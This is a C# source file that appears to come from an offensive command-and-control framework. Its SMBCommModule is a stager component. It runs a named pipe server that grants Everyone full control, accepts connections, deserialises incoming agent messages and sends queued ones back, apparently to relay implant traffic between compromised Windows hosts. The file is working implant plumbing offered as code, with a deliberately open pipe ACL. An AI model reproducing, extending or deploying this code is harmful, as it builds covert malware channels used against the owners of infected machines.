using Shared.Models;
using Shared.Utilities;

using Stager.Models;

using System;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Stager.Comms
{
    public class SMBCommModule : CommModule
    {
        readonly string PipeName;

        ManualResetEvent Event = new ManualResetEvent(false);

        public SMBCommModule(string PipeName)
        {
            this.PipeName = PipeName;
        }

        public override void Start()
        {
            Status = ModuleStatus.Running;

            var ps = new PipeSecurity();

            ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                PipeAccessRights.FullControl, AccessControlType.Allow));

            Task.Factory.StartNew(delegate ()
            {
                while (Status == ModuleStatus.Running)
                {
                    Event.Reset();

                    var pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 1024, 1024, ps);
                    pipe.BeginWaitForConnection(new AsyncCallback(ConnectCallback), pipe);

                    Event.WaitOne();

                    Thread.Sleep(1000);
                }
            });
        }

        void ConnectCallback(IAsyncResult ar)
        {
            Event.Set();

            var pipe = ar.AsyncState as NamedPipeServerStream;
            pipe.EndWaitForConnection(ar);

            var state = new CommStateObject
            {
                Worker = pipe
            };

            pipe.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
        }

        void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as CommStateObject;
            var pipe = state.Worker as NamedPipeServerStream;

            var bytesRead = 0;

            try
            {
                bytesRead = pipe.EndRead(ar);
            }
            catch
            {

            }

            if (bytesRead > 0)
            {
                var data = DataJuggle(bytesRead, pipe, state);
                var messageIn = Utilities.DeserialiseData<AgentMessage>(data);

                if (messageIn != null)
                {
                    Inbound.Enqueue(messageIn);
                }
            }

            if (Outbound.Count > 0)
            {
                var messageOut = Outbound.Dequeue();
                var dataToSend = Utilities.SerialiseData(messageOut);
                pipe.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), pipe);
            }
        }

        void WriteCallback(IAsyncResult ar)
        {
            var pipe = ar.AsyncState as NamedPipeServerStream;

            pipe.EndWrite(ar);
            pipe.Close();
        }

        byte[] DataJuggle(int bytesRead, NamedPipeServerStream stream, CommStateObject state)
        {
            var final = new byte[] { };

            var dataReceived = state.Buffer.TrimBytes();

            if (bytesRead == state.Buffer.Length)
            {
                if (state.SwapBuffer != null)
                {
                    var tmp = state.SwapBuffer;
                    state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                    Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
                }
                else
                {
                    state.SwapBuffer = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
                }

                Array.Clear(state.Buffer, 0, state.Buffer.Length);
                stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
            }
            else
            {
                if (state.SwapBuffer != null)
                {
                    final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                    Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                    Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
                }
                else
                {
                    final = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
                }
            }

            return final.TrimBytes();
        }
    }
}